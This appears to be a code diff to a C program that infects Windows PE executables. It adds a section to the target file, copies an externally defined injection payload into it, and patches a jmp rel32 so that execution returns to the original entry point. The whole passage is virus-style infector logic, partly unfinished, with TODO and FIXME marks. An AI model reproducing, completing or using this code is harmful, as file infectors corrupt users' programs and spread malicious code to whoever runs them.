@@ -7,17 +7,20 @@
 #include "pe.h"
 #include "infect.h"
 
-#define INJECTION_SIZE 5
-#define FILLED_INJECTION_SIZE 0x200
+#define INJECTION_TAIL_SIZE 6
+#define FILLED_INJECTION_SIZE 0x1000
 
-u8 injection[INJECTION_SIZE] = {
-    '\xe9', '\x00', '\x00', '\x00', '\x00' // jmp rel32
+u8 injection_tail[INJECTION_TAIL_SIZE] = {
+    '\xe9', '\x00', '\x00', '\x00', '\x00', '\x00' // jmp rel32
 };
 u8 filled_injection[FILLED_INJECTION_SIZE];
 u8 * file;
 u32 address_of_entry_point_new;
 
 u8 test[5];
+extern int off;
+extern char injection[];
+extern int INJECTION_SIZE_RAW;
 
 
 inline int WriteFileAt(HANDLE file_handle, void* data, u32 size_to_write,u64 point){
@@ -46,19 +49,21 @@ inline int WriteFileAt(HANDLE file_handle, void* data, u32 size_to_write,u64 poi
 }
 
 void AdjustInjection(u8 injection[]){ // TODO complete this!
-    int address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment; // FIXME
+    int address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment + off; // FIXME
     u32 target = address_of_entry_point_old - address_of_entry_point_new - 5;
-    memcpy(injection + 1, &target, 4);
-    memcpy(filled_injection, injection, INJECTION_SIZE);
+    memcpy(filled_injection, injection, INJECTION_SIZE_RAW);
+    memcpy(injection_tail + 1, &target, 4);
+    memcpy(filled_injection + INJECTION_SIZE_RAW, injection_tail, INJECTION_TAIL_SIZE);
 }
 
 void infect(u8 injection[], HANDLE file_handle){
     address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment; // FIXME
-    u32 virtual_size = INJECTION_SIZE;
+    int injection_size = INJECTION_SIZE_RAW + INJECTION_TAIL_SIZE;
+    u32 virtual_size = injection_size;
     u32 virtual_address = address_of_entry_point_new;
     int file_alignment_num;
-    file_alignment_num = INJECTION_SIZE / file_alignment;
-    if(INJECTION_SIZE % file_alignment > 0){
+    file_alignment_num = injection_size / file_alignment;
+    if(injection_size % file_alignment > 0){
         file_alignment_num ++;
     }
     u32 size_of_raw_data = file_alignment_num * file_alignment;
